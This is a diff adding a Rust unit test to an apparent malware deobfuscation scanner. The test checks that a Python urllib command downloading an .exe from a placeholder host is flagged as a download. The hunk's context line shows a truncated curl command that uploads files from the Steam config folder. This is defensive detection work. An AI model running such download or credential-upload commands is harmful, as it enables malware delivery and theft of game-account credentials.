@@ -11104,6 +11104,38 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; urllib.request.urlretrieve('https://py.example/file.exe', 'file.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/file.exe" && dst.as_deref() == Some("file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urllib urlretrieve: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_b64decode_literal_recurses_into_decoded_source_urls() {
         use base64::Engine;
 
